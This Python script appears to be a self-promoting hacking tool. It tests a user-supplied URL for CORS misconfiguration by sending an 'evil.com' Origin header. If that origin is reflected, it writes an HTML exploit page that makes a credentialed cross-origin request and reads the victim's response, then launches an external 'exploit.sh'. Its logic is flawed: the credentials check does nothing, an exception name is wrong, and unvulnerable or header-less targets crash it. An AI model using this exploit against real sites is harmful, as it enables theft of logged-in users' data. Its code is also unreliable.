#!/usr/bin/python
import os
import requests
from colorama import Fore
import random

white = Fore.WHITE
green = Fore.GREEN
red = Fore.RED
yellow = Fore.YELLOW
cyan = Fore.CYAN

colors = (white, green, red, yellow, cyan)
color = random.choice(colors)

banner = '''
██╗   ██╗███████╗███╗   ██╗ ██████╗ ███╗   ███╗       ██████╗ ██████╗ ██████╗ ███████╗      ██████╗ ████████╗███████╗ ██████╗████████╗
██║   ██║██╔════╝████╗  ██║██╔═══██╗████╗ ████║      ██╔════╝██╔═══██╗██╔══██╗██╔════╝      ██╔══██╗╚══██╔══╝██╔════╝██╔════╝╚══██╔══╝
██║   ██║█████╗  ██╔██╗ ██║██║   ██║██╔████╔██║█████╗██║     ██║   ██║██████╔╝███████╗█████╗██║  ██║   ██║   █████╗  ██║        ██║   
╚██╗ ██╔╝██╔══╝  ██║╚██╗██║██║   ██║██║╚██╔╝██║╚════╝██║     ██║   ██║██╔══██╗╚════██║╚════╝██║  ██║   ██║   ██╔══╝  ██║        ██║   
 ╚████╔╝ ███████╗██║ ╚████║╚██████╔╝██║ ╚═╝ ██║      ╚██████╗╚██████╔╝██║  ██║███████║      ██████╔╝   ██║   ███████╗╚██████╗   ██║   
  ╚═══╝  ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝       ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝      ╚═════╝    ╚═╝   ╚══════╝ ╚═════╝   ╚═╝   
                                                                                                                                      

'''
author = 'Venom 🐍 (Gaurav Chaudhary)'
team = 'From Team Venom 🐍'
facebook = 'https://facebook.com/venomgrills'
insta = 'https://instagram.com/i.m.gauravchaudhary'
github = 'https://github.com/venomsec-Dev/'
print(color + banner + color)
print(color + '   Author: ' + color + green + author + green)
print(color + '   Team: ' + color + red + team + red)
print(color + '   Facebook: ' + color + yellow + facebook + yellow)
print(color + '   Insta: ' + color + cyan + insta + cyan)
print(color + '   Github: ' + color + white + github + white)
print('\n')
target = input(white + '     [+] ' + white + color + 'Enter the url: ' + color)
#check
vulnerable = []
headers = {'origin': 'https://evil.com',
           'user-agent': "'Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3'"}
response = requests.get(url=target, headers=headers)
check = response.headers
if check['Access-Control-Allow-Origin'] == 'https://evil.com':
    print(white + '     [+] ' + white + color + 'Vulnerable: ' + color + green + 'True' + green)
    vulnerable.append('1')
    try:
        check['Access-Control-Allow-Credentials'] == 'True'
        print(white + '     [+] ' + white + color + 'Severity: ' + color + green + 'High' + green)
    except keyerror as e:
        print('Severity: Low')
else:
    print(white + '      [-] ' + white + color + 'Vulnerable: ' + color + red + 'False' + red)
site = "'" + target + "'" 
#exploit
if vulnerable[0] == '1':
    choice = input(white + '     [+] ' + white + color + 'Do you want to exploit it?: ' + color)
    if choice == 'y' or choice == 'Y':
        exploit = "<html>\n<script>\nvar req = new XMLHttpRequest(); req.onload = reqListener; req.open('get'," + site + ",'true'); req.withCredentials = true; req.send('{}'); function reqListener() { alert(this.responseText); };\n</script>\n</html>"
        op = open('index.html', 'w')
        op.write(exploit)
        op.close()
        run = os.system('bash exploit.sh')
else:
    pass

